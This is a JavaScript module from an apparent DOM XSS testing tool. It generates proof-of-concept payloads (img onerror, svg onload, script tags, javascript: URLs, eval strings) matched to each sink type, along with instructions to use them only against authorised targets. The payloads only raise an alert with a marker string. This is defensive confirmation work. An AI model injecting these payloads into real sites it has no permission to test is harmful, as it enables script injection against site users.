// Plain-text, non-obfuscated PoC payload templates for confirming DOM XSS sinks.
// These are deliberately readable and unpacked. This tool does not alter them
// to evade antivirus, secure web gateways, or firewalls -- see PRD.md "Non-Goals".

const MARKER = () => `JSRECON-${Date.now()}`;

const TEMPLATES = {
  innerHTML: (marker) => `<img src=x onerror="console.warn('${marker}');alert('${marker}')">`,
  outerHTML: (marker) => `<img src=x onerror="console.warn('${marker}');alert('${marker}')">`,
  insertAdjacentHTML: (marker) => `<svg onload="console.warn('${marker}');alert('${marker}')">`,
  write: (marker) => `<script>console.warn('${marker}');alert('${marker}')<\/script>`,
  writeln: (marker) => `<script>console.warn('${marker}');alert('${marker}')<\/script>`,
  eval: (marker) => `alert('${marker}')`,
  'Function-constructor': (marker) => `alert('${marker}')`,
  'setTimeout-string-arg': (marker) => `alert('${marker}')`,
  'setInterval-string-arg': (marker) => `alert('${marker}')`,
  'location.assign': (marker) => `javascript:alert('${marker}')`,
  'location.replace': (marker) => `javascript:alert('${marker}')`,
  default: (marker) => `<img src=x onerror="alert('${marker}')">`
};

function generatePayloadForFinding(finding) {
  const marker = MARKER();
  const builder = TEMPLATES[finding.sinkType] || TEMPLATES.default;
  const payload = builder(marker);

  return {
    findingRef: {
      sinkType: finding.sinkType,
      sourceFile: finding.sourceFile,
      line: finding.line
    },
    marker,
    payload,
    manualInstructions: [
      'This payload is plain text and is not obfuscated or packed.',
      'Only use it against a target you own or are explicitly authorized to test.',
      `Confirmation: if executed, it logs and alerts the marker string "${marker}" so you can visually confirm without ambiguity.`,
      'To fire manually: paste the relevant fragment into the vulnerable input/parameter identified in the finding, or use the in-app "Fire in current tab" action which requires the authorization checkbox to be enabled.'
    ]
  };
}

function generatePayloadSet(findings) {
  return findings.map(generatePayloadForFinding);
}

module.exports = { generatePayloadForFinding, generatePayloadSet };
